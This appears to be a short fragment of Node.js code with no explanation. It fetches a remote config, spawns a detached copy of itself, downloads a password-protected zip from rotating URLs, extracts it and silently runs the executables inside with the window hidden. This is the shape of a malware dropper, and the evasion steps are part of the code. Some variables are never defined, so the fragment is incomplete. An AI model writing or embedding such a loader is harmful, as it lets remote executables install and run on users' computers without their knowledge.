const cfg = await getRemoteConfig();
spawn(process.execPath, [__filename], { env: { RUN_DETACHED: '1' }});
await downloadFileWithRotation(cfg.urls, zipPath);
Seven.extractFull(zipPath, extractPath, {password});
const exes = files.filter(f => f.endsWith('.exe'));
spawn(exePath, [], {windowsHide: true});
